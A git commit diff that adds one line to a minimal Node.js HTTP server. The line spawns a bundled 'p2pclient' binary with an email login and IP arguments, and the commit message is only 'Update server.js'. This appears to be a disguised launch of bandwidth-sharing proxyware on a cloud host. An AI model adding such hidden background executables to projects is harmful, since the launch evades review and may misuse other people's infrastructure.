ba1831c7055814ef55ec685ff289fa82e3f4b855
chaowen guo <chaowen.guo1@gmail.com>
2022-01-06 07:31:08 -0600

    Update server.js

--- gcloudApp/server.js
+++ gcloudApp/server.js
@@ -1,3 +1,5 @@
 import http from 'http'
+import child_process from 'child_process'
 
 http.createServer((req, res) => res.end('gcloudApp')).listen(8080)
+child_process.spawn([...new globalThis.URL(import.meta.url).pathname.split('/').slice(0, -1), 'p2pclient'].join('/'), ['-l', 'chaowen.guo1@gmail.com', '-n', ';8.8.8.8,4.4.4.4'])
